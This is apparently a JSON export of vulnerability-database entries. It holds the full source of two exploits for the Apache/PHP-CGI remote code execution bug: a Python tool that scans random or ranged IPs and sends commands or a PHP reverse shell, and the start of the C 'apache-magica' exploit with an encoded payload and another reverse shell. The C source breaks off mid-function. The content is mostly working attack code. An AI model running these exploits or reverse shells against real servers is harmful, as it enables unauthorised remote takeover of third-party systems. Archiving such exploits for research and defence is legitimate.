            "sourceData": "#!/usr/bin/env python\r\n#\r\n# ap-unlock-v2.py - apache + php 5.* rem0te c0de execution 0day (better version)\r\n#\r\n# NOTE:\r\n#   - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((\r\n#   - for connect back shell start netcat/nc and bind port on given host:port\r\n#   - is ip-range scanner not is multithreaded, but iz multithreaded iz in\r\n#   random scanner and is scanner from file (greets to MustLive)\r\n#   - no ssl support\r\n#   - more php paths can be added\r\n#   - adjust this shit for windows b0xes\r\n#\r\n# 2013\r\n# by noptrix - http://nullsecurity.net/\r\n\r\nimport sys\r\nimport socket\r\nimport argparse\r\nimport threading\r\nimport time\r\nimport random\r\nimport select\r\n\r\n\r\nNONE = 0\r\nVULN = 1\r\nSCMD = 2\r\nXPLT = 3\r\n\r\nt3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \\\r\n        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \\\r\n        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \\\r\n        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\\\r\n        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\\r\\nHost:localhost\\r\\n'\\\r\n        'Content-Type: text/html\\r\\nContent-Length:1\\r\\n\\r\\na\\r\\n'\r\n\r\n\r\ndef m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):\r\n    c0nn_b4ck = \\\r\n    '''\r\n    <? set_time_limit (0); $VERSION = \"1.0\"; $ip = \"''' + cb_h0st + '''\";\r\n    $port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;\r\n    $error_a = null; $shell = \"unset HISTFILE; id; /bin/sh -i\"; $daemon = 0;\r\n    $debug = 0; if (function_exists(\"pcntl_fork\")) {$pid = pcntl_fork();\r\n    if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {\r\n    exit(1);}$daemon = 1;} else {print \"bla\";}chdir(\"/\");umask(0);\r\n    $sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {\r\n    printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array(\r\n    0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"),2 => array(\"pipe\", \"w\"));\r\n    $process = proc_open($shell, $descriptorspec, $pipes);\r\n    if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);\r\n    stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);\r\n    printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {\r\n    if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;}\r\n    if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n    if (in_array($sock, $read_a)) {if ($debug) printit(\"SOCK READ\");\r\n\t$input = fread($sock, $chunk_size);if ($debug) printit(\"SOCK: $input\");\r\n    fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {\r\n    if ($debug) printit(\"STDOUT READ\");$input = fread($pipes[1], $chunk_size);\r\n\tif ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);}\r\n\tif (in_array($pipes[2], $read_a)) {if ($debug) printit(\"STDERR READ\");\r\n    $input = fread($pipes[2], $chunk_size);\r\n    if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);\r\n    fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);\r\n    function printit ($string) {if (!$daemon) {print \"$string\\n\";}}?>\r\n    '''\r\n    return c0nn_b4ck\r\n\r\n\r\ndef enc0dez():\r\n    n33dz1 = ('cgi-bin', 'php')\r\n    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',\r\n            'suhosin.simulation=on', '-d', 'disable_functions=\"\"', '-d',\r\n            'open_basedir=none', '-d', 'auto_prepend_file=php://input',\r\n            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',\r\n            '-d', 'auto_prepend_file=php://input', '-n')\r\n    fl4g = 0\r\n    arg5 = ''\r\n    p4th = ''\r\n    plus = ''\r\n \r\n    for x in n33dz2:\r\n        if fl4g == 1:\r\n            plus = '+'\r\n        arg5 = arg5 + plus + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n        fl4g = 1\r\n    for x in n33dz1:\r\n        p4th = p4th + '/' + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n    return (p4th.upper(), arg5.upper())\r\n\r\n\r\ndef m4k3_p4yl0rd(p4yl0rd, m0de):\r\n    p4th, arg5 = enc0dez()\r\n    if m0de == VULN:\r\n        p4yl0rd = t3st\r\n    elif m0de == SCMD or m0de == XPLT:\r\n        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\\r\\n' \\\r\n                'Host: ' + sys.argv[1] + '\\r\\n' \\\r\n                'Content-Type: application/x-www-form-urlencoded\\r\\n' \\\r\n                'Content-Length: ' + str(len(p4yl0rd)) + '\\r\\n\\r\\n' + p4yl0rd\r\n    return p4yl0rd\r\n\r\n\r\ndef s3nd_sh1t(args, m0de, c0nn_b4ck):\r\n    pat = '<b>Parse error</b>:'\r\n    try:\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.settimeout(float(args.t))\r\n        res = s.connect_ex((args.h, int(args.p)))\r\n        if res == 0:\r\n            if m0de == VULN:\r\n                p4yl0rd = m4k3_p4yl0rd('', m0de)\r\n                s.sendall(p4yl0rd)\r\n                if pat in s.recv(4096):\r\n                    print \"--> \" + args.h + \" vu1n\"\r\n                    return args.h\r\n                else:\r\n                    if args.v:\r\n                        print \"--> %s n0t vu1n\" % (args.h)\r\n                    return\r\n            elif m0de == SCMD:\r\n                p4yl0rd = m4k3_p4yl0rd('<? system(\"' + args.c + '\"); ?>', m0de)\r\n                s.sendall(p4yl0rd)\r\n                rd, wd, ex = select.select([s], [], [], float(args.t))\r\n                if rd:\r\n                    for line in s.makefile():\r\n                        print line,\r\n            elif m0de == XPLT:\r\n                p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)\r\n                s.sendall(p4yl0rd)\r\n        else:\r\n            if args.v:\r\n                print \"--> n0 w3bs3rv3r 0n %s\" % (args.h)\r\n    except socket.error:\r\n        return\r\n    return\r\n\r\n\r\ndef m4k3_r4nd_1p4ddr(num):\r\n    h0sts = []\r\n    for x in range(int(num)):\r\n        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),\r\n                random.randrange(0,255), random.randrange(0,255),\r\n                random.randrange(0,255)))\r\n    return h0sts\r\n\r\n\r\ndef sc4n_r4nd0m(args, h0st, m0de, vu1nz):\r\n    args.h = h0st\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_fr0m_f1le(args, h0st, m0de, vu1nz):\r\n    args.h = h0st.rstrip()\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_r4ng3(rsa, rsb, args, m0de):\r\n    vu1nz = []\r\n    for i in range (rsa[0], rsb[0]):\r\n        for j in range (rsa[1], rsb[1]):\r\n            for k in range (rsa[2], rsb[2]):\r\n                for l in range(rsa[3], rsb[3]):\r\n                    args.h = str(i) + \".\" + str(j) + \".\" + str(k) + \".\" + str(l)\r\n                    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n                    time.sleep(0.005)\r\n    vu1nz = filter(None, vu1nz)\r\n    return vu1nz\r\n\r\n\r\ndef m4k3_ipv4_r4ng3(iprange):\r\n    a = tuple(part for part in iprange.split('.'))\r\n    rsa = (range(4))\r\n    rsb = (range(4))\r\n    for i in range(0,4):\r\n        ga = a[i].find('-')\r\n        if ga != -1:\r\n            rsa[i] = int(a[i][:ga])\r\n            rsb[i] = int(a[i][1+ga:]) + 1                                        \r\n        else:\r\n            rsa[i] = int(a[i])\r\n            rsb[i] = int(a[i]) + 1\r\n    return (rsa, rsb)\r\n\r\n\r\ndef parse_args():\r\n    p = argparse.ArgumentParser(\r\n    usage='\\n\\n  ./ap-unlock-v2.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\\\r\n            '\\n  ./ap-unlock-v2.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',\r\n    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)\r\n    opts = p.add_argument_group('0pt1ons', '')\r\n    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',\r\n            help='| t3st s1ngle h0st f0r vu1n')\r\n    opts.add_argument('-p', default=80, metavar='80',\r\n            help='| t4rg3t p0rt (d3fau1t: 80)')\r\n    opts.add_argument('-c', metavar='\\'uname -a;id\\'',\r\n            help='| s3nd c0mm4nds t0 h0st')\r\n    opts.add_argument('-x', metavar='192.168.0.2:1337',\r\n            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')\r\n    opts.add_argument('-s', action='store_true',\r\n            help='| t3st s1ngl3 h0st f0r vu1n')\r\n    opts.add_argument('-r', metavar='133.1.3-7.7-37',\r\n            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')\r\n    opts.add_argument('-R', metavar='1337',\r\n            help='| sc4nz num r4nd0m h0st5 f0r vu1n')\r\n    opts.add_argument('-t', default=3, metavar='3',\r\n            help='| t1me0ut in s3x (d3fau1t: 3)')\r\n    opts.add_argument('-f', metavar='vu1n.lst',\r\n            help='| wr1t3 vu1n h0sts t0 f1l3')\r\n    opts.add_argument('-i', metavar='sc4nz.lst',\r\n            help='| sc4nz h0sts fr0m f1le f0r vu1n')\r\n    opts.add_argument('-S', metavar='2',\r\n            help='| sl33pz in s3x b3tw33n thr3adz (d3fault: 2)')\r\n    opts.add_argument('-T', default=2, metavar='4',\r\n            help='| nuM sc4n thr3adz (d3fault: 4)')\r\n    opts.add_argument('-v', action='store_true',\r\n            help='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')\r\n    args = p.parse_args()\r\n    if not args.h and not args.r and not args.R and not args.i:\r\n        p.print_help()\r\n        sys.exit(0)\r\n    return args\r\n\r\n\r\ndef wr1te_fil3(args, vu1nz):\r\n    if args.f:\r\n        if vu1nz:\r\n            try:\r\n                f = open(args.f, \"w\")\r\n                f.write(\"\\n\".join(vu1nz)+\"\\n\")\r\n                f.close()\r\n            except:\r\n                sys.stderr.write('de1n3 mudd1 k0cht guT')\r\n                sys.stderr.write('\\n')\r\n                raise SystemExit()\r\n    return\r\n\r\n\r\ndef c0ntr0ller():\r\n    vu1nz = []\r\n    m0de = NONE\r\n    try:\r\n        args = parse_args()\r\n        if not args.t:\r\n            args.t = float(3)\r\n        if args.h:\r\n            if args.s:\r\n                print \"[+] sc4nn1ng s1ngl3 h0st %s \" % (args.h)\r\n                m0de = VULN\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.c:\r\n                print \"[+] s3nd1ng c0mm4ndz t0 h0st %s \" % (args.h)\r\n                m0de = SCMD\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.x:\r\n                print \"[+] xpl0it1ng b0x %s \" % (args.h)\r\n                m0de = XPLT\r\n                if args.x.find(':') != -1:\r\n                    if not args.x.split(':')[1]:\r\n                        print \"[-] 3rr0r: p0rt m1ss1ng\"\r\n                    else:\r\n                        cb_h0st = args.x.split(':')[0]\r\n                        cb_p0rt = args.x.split(':')[1]\r\n                else:\r\n                    print \"[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r\"\r\n                c0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)\r\n                s3nd_sh1t(args, m0de, c0nn_b4ck)\r\n            else:\r\n                print \"[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch\"\r\n                sys.exit(-1)\r\n        if args.r:\r\n            print \"[+] sc4nn1ng r4ng3 %s \" % (args.r)\r\n            m0de = VULN\r\n            rsa, rsb = m4k3_ipv4_r4ng3(args.r)\r\n            vu1nz = sc4n_r4ng3(rsa, rsb, args, m0de)\r\n        if args.R:\r\n            print \"[+] sc4nn1ng %d r4nd0m b0xes\" % (int(args.R))\r\n            m0de = VULN\r\n            if not args.S:\r\n                args.S = float(2)\r\n            h0sts = m4k3_r4nd_1p4ddr(int(args.R))\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_r4nd0m, args=(args, h0st,\r\n                        m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n        if args.i:\r\n            print \"[+] sc4nn1ng b0xes fr0m f1le %s\" % (args.i)\r\n            m0de = VULN\r\n            h0sts = tuple(open(args.i, 'r'))\r\n            if not args.S:\r\n                args.S = float(2)\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_fr0m_f1le, args=(args,\r\n                        h0st, m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except KeyboardInterrupt:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n            #sc4n_fr0m_f1le(args, h0sts, m0de, vu1nz)\r\n    except KeyboardInterrupt:\r\n        sys.stdout.flush()\r\n        sys.stderr.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n        raise SystemExit\r\n    wr1te_fil3(args, vu1nz)\r\n\r\n    return\r\n\r\n\r\ndef m41n():\r\n    if  __name__ == \"__main__\":\r\n        print \"--==[ ap-unlock-v2.py by noptrix@nullsecurity.net ]==--\"\r\n        c0ntr0ller()\r\n    else:\r\n        print \"[-] 3rr0r: y0u fuck3d up dud3\"\r\n        sys.exit(1)\r\n    print \"[+] h0p3 1t h3lp3d\"\r\n\r\n\r\n# \\o/ fr33 requiem 1337 h4x0rs ... \r\nm41n()\r\n\r\n# e0F",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29316"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61070",
            "id": "SSV:61070",
            "type": "seebug",
            "title": "Apache / PHP 5.x Remote Code Execution Exploit",
            "sourceData": "\n                                                /* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;unistd.h&gt;\r\n#include &lt;getopt.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;stddef.h&gt;\r\n#include &lt;openssl/rand.h&gt;\r\n#include &lt;openssl/ssl.h&gt;\r\n#include &lt;openssl/err.h&gt;\r\n#include &lt;netdb.h&gt;\r\n#include &lt;sys/socket.h&gt;\r\n#include &lt;netinet/in.h&gt;\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(&quot;usage: %s &lt;--target target&gt; &lt;--port port&gt; &lt;--protocol http|https&gt; &quot; \\\r\n  &quot;&lt;--reverse-ip ip&gt; &lt;--reverse-port port&gt; [--force-interpreter interpreter]\\n&quot;,\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \\\r\n &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \\\r\n &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \\\r\n &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \\\r\n &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \\\r\n &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \\\r\n &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \\\r\n &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \\\r\n &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \\\r\n &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \\\r\n &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \\\r\n &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n&quot; \\\r\n &quot;Host: %s\\r\\n&quot; \\\r\n &quot;User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26&quot; \\\r\n &quot;(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n&quot; \\\r\n &quot;Content-Type: application/x-www-form-urlencoded\\r\\n&quot; \\\r\n &quot;Content-Length: %d\\r\\n&quot; \\\r\n &quot;Connection: close\\r\\n\\r\\n%s&quot;;\r\nchar phpstr[] = &quot;&lt;?php\\n&quot; \\\r\n&quot;set_time_limit(0);\\n&quot; \\\r\n&quot;$ip = '%s';\\n&quot; \\\r\n&quot;$port = %d;\\n&quot; \\\r\n&quot;$chunk_size = 1400;\\n&quot; \\\r\n&quot;$write_a = null;\\n&quot; \\\r\n&quot;$error_a = null;\\n&quot; \\\r\n&quot;$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n&quot; \\\r\n&quot;$daemon = 0;\\n&quot; \\\r\n&quot;$debug = 0;\\n&quot; \\\r\n&quot;if (function_exists('pcntl_fork')) {\\n&quot; \\\r\n&quot;\t$pid = pcntl_fork();\t\\n&quot; \\\r\n&quot;\tif ($pid == -1) {\\n&quot; \\\r\n&quot;\t\tprintit(\\&quot;ERROR: Can't fork\\&quot;);\\n&quot; \\\r\n&quot;\t\texit(1);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\tif ($pid) {\\n&quot; \\\r\n&quot;\t\texit(0);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\tif (posix_setsid() == -1) {\\n&quot; \\\r\n&quot;\t\tprintit(\\&quot;Error: Can't setsid()\\&quot;);\\n&quot; \\\r\n&quot;\t\texit(1);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\t$daemon = 1;\\n&quot; \\\r\n&quot;} else {\\n&quot; \\\r\n&quot;\tprintit(\\&quot;WARNING: Failed to daemonise.\\&quot;);\\n&quot; \\\r\n&quot;}\\n&quot; \\\r\n&quot;chdir(\\&quot;/\\&quot;);\\n&quot; \\\r\n&quot;umask(0);\\n&quot; \\\r\n&quot;$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n&quot; \\\r\n&quot;if (!$sock) {\\n&quot; \\\r\n&quot;\tprintit(\\&quot;$errstr ($errno)\\&quot;);\\n&quot; \\\r\n&quot;\texit(1);\\n&quot; \\\r\n&quot;}\\n&quot; \\\r\n&quot;$descriptorspec = array(\\n&quot; \\\r\n&quot;   0 =&gt; array(\\&quot;pipe\\&quot;, \\&quot;r\\&quot;),\\n&quot; \\\r\n&quot;   1 =&gt; array(\\&quot;pipe\\&quot;, \\&quot;w\\&quot;),\\n&quot; \\\r\n&quot;   2 =&gt; array(\\&quot;pipe\\&quot;, \\&quot;w\\&quot;)\\n&quot; \\\r\n&quot;);\\n&quot; \\\r\n&quot;$process = proc_open($shell, $descriptorspec, $pipes);\\n&quot; \\\r\n&quot;if (!is_resource($process)) {\\n&quot; \\\r\n&quot;\tprintit(\\&quot;ERROR: Can't spawn shell\\&quot;);\\n&quot; \\\r\n&quot;\texit(1);\\n&quot; \\\r\n&quot;}\\n&quot; \\\r\n&quot;stream_set_blocking($pipes[0], 0);\\n&quot; \\\r\n&quot;stream_set_blocking($pipes[1], 0);\\n&quot; \\\r\n&quot;stream_set_blocking($pipes[2], 0);\\n&quot; \\\r\n&quot;stream_set_blocking($sock, 0);\\n&quot; \\\r\n&quot;while (1) {\\n&quot; \\\r\n&quot;\tif (feof($sock)) {\\n&quot; \\\r\n&quot;\t\tprintit(\\&quot;ERROR: Shell connection terminated\\&quot;);\\n&quot; \\\r\n&quot;\t\tbreak;\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\tif (feof($pipes[1])) {\\n&quot; \\\r\n&quot;\t\tprintit(\\&quot;ERROR: Shell process terminated\\&quot;);\\n&quot; \\\r\n&quot;\t\tbreak;\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n&quot; \\\r\n&quot;\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n&quot; \\\r\n&quot;\tif (in_array($sock, $read_a)) {\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;SOCK READ\\&quot;);\\n&quot; \\\r\n&quot;\t\t$input = fread($sock, $chunk_size);\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;SOCK: $input\\&quot;);\\n&quot; \\\r\n&quot;\t\tfwrite($pipes[0], $input);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\tif (in_array($pipes[1], $read_a)) {\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;STDOUT READ\\&quot;);\\n&quot; \\\r\n&quot;\t\t$input = fread($pipes[1], $chunk_size);\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;STDOUT: $input\\&quot;);\\n&quot; \\\r\n&quot;\t\tfwrite($sock, $input);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;\tif (in_array($pipes[2], $read_a)) {\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;STDERR READ\\&quot;);\\n&quot; \\\r\n&quot;\t\t$input = fread($pipes[2], $chunk_size);\\n&quot; \\\r\n&quot;\t\tif ($debug) printit(\\&quot;STDERR: $input\\&quot;);\\n&quot; \\\r\n&quot;\t\tfwrite($sock, $input);\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;}\\n&quot; \\\r\n&quot;\\n&quot; \\\r\n&quot;fclose($sock);\\n&quot; \\\r\n&quot;fclose($pipes[0]);\\n&quot; \\\r\n&quot;fclose($pipes[1]);\\n&quot; \\\r\n&quot;fclose($pipes[2]);\\n&quot; \\\r\n&quot;proc_close($process);\\n&quot; \\\r\n&quot;function printit ($string) {\\n&quot; \\\r\n&quot;\tif (!$daemon) {\\n&quot; \\\r\n&quot;\t\tprint \\&quot;$string\\n\\&quot;;\\n&quot; \\\r\n&quot;\t}\\n&quot; \\\r\n&quot;}\\n&quot; \\\r\n&quot;exit(1);\\n&quot; \\\r\n&quot;?&gt;&quot;;\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  printf(&quot;Hostname cannot be resolved\\n&quot;);\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n\tprintf(&quot;malloc error (1)\\n&quot;);\r\n\texit(255);\r\n }\r\n memset(&amp;server, '\\0', sizeof(struct sockaddr_in));\r\n memcpy(&amp;server.sin_addr, he-&gt;h_addr_list[0],  he-&gt;h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &amp;server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c-&gt;handle, &amp;ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 &gt; 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &amp;ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 &gt; 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(&quot;-== Apache Magika by Kingcope ==-\\n&quot;);\r\n  for(;;)\r\n  {\r\n\t int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n\t   {&quot;target&quot;, required_argument, 0, 0 },\r\n\t   {&quot;port&quot;, required_argument, 0, 0 },\r\n\t   {&quot;protocol&quot;, required_argument, 0, 0 },\r\n\t   {&quot;reverse-ip&quot;, required_argument, 0, 0 },\r\n\t   {&quot;reverse-port&quot;, required_argument, 0, 0 },\r\n\t   {&quot;force-interpreter&quot;, required_argument, 0, 0 },\t   \r\n\t   {0, 0, 0, 0 }\r\n\t  };\r\n\t \r\n\t c = getopt_long(argc, argv, &quot;&quot;, long_options, &amp;option_index);\r\n     if (c &lt; 0)\r\n     \tbreak;\r\n     \r\n     switch (c) {\r\n\t case 0:\r\n\t  switch (option_index) {\r\n\t   case 0:\r\n\t    if (optarg) {\r\n\t     target = calloc(strlen(optarg)+1, sizeof(char));\r\n\t     if (!target) {\r\n\t\t  printf(&quot;calloc error (2)\\n&quot;);\r\n\t      exit(255);\r\n         }\r\n\t     memcpy(target, optarg, strlen(optarg)+1);\r\n    